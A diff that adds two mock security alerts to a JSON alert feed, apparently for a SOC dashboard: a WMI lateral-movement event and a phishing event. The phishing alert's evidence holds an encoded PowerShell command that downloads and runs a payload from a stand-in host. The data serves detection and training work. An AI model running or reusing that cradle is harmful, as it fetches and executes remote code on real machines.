@@ -1849,5 +1849,45 @@
     },
     "createdAt": "2026-05-31T14:54:45.314Z",
     "updatedAt": "2026-05-31T14:54:45.314Z"
+  },
+  {
+    "_id": "zedq2ab",
+    "timestamp": "2026-05-31T14:55:00.313Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:55:00.315Z",
+    "updatedAt": "2026-05-31T14:55:00.315Z"
+  },
+  {
+    "_id": "lgvrxj9",
+    "timestamp": "2026-05-31T14:55:15.314Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:55:15.315Z",
+    "updatedAt": "2026-05-31T14:55:15.315Z"
   }
 ]
